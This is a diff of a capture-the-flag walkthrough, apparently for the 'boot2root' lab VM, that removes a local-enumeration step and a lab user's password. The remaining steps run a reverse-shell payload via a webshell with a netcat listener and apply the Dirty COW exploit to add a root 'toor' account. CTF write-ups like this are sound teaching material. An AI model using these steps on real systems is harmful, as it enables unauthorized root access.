@@ -121,55 +121,16 @@
 
 	> Replace `<attacker-ip>` and `<port>`
 
-	Encode the payload for URL and run it via the webshell. Listen on port 1234 with `nc -lvnp 1234` and get a reverse shell as `www-data`.
+	Encode the payload for URL and run it via the webshell. Listen on port <port> with `nc -lvnp <port>` and get a reverse shell as `www-data`.
 	To access the reverse shell, use `nc`:
 
 	```bash
 	nc -lvnp <port>
 	```
 
-9. Local Enumeration
+9. Dirty COW Exploit to Root
 
-	Inside the shell:
-
-	```bash
-	cd /home
-	ls -l
-	```
-
-	Output:
-
-	```bash
-	total 0
-	drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
-	drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
-	drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
-	drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
-	dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
-	drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
-	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
-	```
-
-10. Privilege Escalation: lmezard user
-
-	Navigate to `/home/LOOKATME` and find a `password` file:
-
-	```
-	lmezard:G!@M6f4Eatau{sF"
-	```
-
-	Switch user to lmezard:
-
-	```bash
-	su lmezard
-	Password: G!@M6f4Eatau{sF"
-	```
-
-	Successfully logged in as lmezard.
-
-11. Dirty COW Exploit to Root
-
-	Upload and compile **dirty_cow.c** exploit in `/tmp` as lmezard.
+	Upload and compile **dirty_cow.c** exploit in `/tmp` as www-data.
 
 	```bash
 	cat > dirty_cow.c << EOF
@@ -190,11 +151,10 @@
 	toor:tojiVEjmA3vTY:0:0:pwned:/root:/bin/bash
 	```
 
-12. Final Root Access
+10. Final Root Access
 
 	Use `su toor` with the new password set by the exploit and gain root shell.
 
 	| User        | Password                    |
 	| ----------- | --------------------------- |
-	| lmezard     | G!@M6f4Eatau{sF"            |
 	| root (toor) | (new password from exploit) |
